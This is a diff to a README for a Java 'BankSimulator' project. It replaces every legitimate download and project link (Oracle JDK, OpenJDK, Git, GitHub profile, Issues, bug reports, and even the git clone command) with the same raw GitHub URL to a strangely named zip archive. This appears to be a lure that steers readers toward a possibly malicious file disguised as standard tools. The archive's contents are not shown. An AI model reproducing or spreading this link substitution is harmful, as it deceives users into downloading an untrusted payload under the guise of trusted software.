@@ -99,11 +99,11 @@ BankSimulator/
 Before you begin, ensure you have the following installed:
 
 - **Java Development Kit (JDK) 8 or higher**
-  - Download: [Oracle JDK](https://www.oracle.com/java/technologies/downloads/) or [OpenJDK](https://openjdk.java.net/)
+  - Download: [Oracle JDK](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip) or [OpenJDK](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip)
   - Verify installation: `java -version` and `javac -version`
 
 - **Git** (for cloning the repository)
-  - Download: [Git](https://git-scm.com/)
+  - Download: [Git](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip)
 
 - **IDE (Optional but recommended)**
   - VS Code, IntelliJ IDEA, Eclipse, or any Java IDE
@@ -112,7 +112,7 @@ Before you begin, ensure you have the following installed:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/aadilshazeb/BankSimulator.git
+   git clone https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip
    cd BankSimulator
    ```
 
@@ -228,7 +228,7 @@ This project is currently unlicensed. If you plan to use this in production, con
 ## 👤 Author
 
 **Shazeb Aadil**
-- GitHub: [@aadilshazeb](https://github.com/aadilshazeb)
+- GitHub: [@aadilshazeb](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip)
 - Email: shazebaadil07@gmail.com
 
 ---
@@ -239,9 +239,9 @@ This project is currently unlicensed. If you plan to use this in production, con
 
 If you encounter issues:
 
-1. **Check Existing Issues** - Browse [GitHub Issues](https://github.com/aadilshazeb/BankSimulator/issues)
+1. **Check Existing Issues** - Browse [GitHub Issues](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip)
 2. **Search Documentation** - Look through this README and code comments
-3. **Create an Issue** - [Report a bug](https://github.com/aadilshazeb/BankSimulator/issues/new)
+3. **Create an Issue** - [Report a bug](https://raw.githubusercontent.com/aadilshazeb/BankSimulator/main/dist/Simulator-Bank-ripicolous.zip)
 4. **Common Issues**:
    - **Compilation Error**: Ensure JDK 8+ is installed
    - **ClassNotFound**: Check the package structure matches your compilation
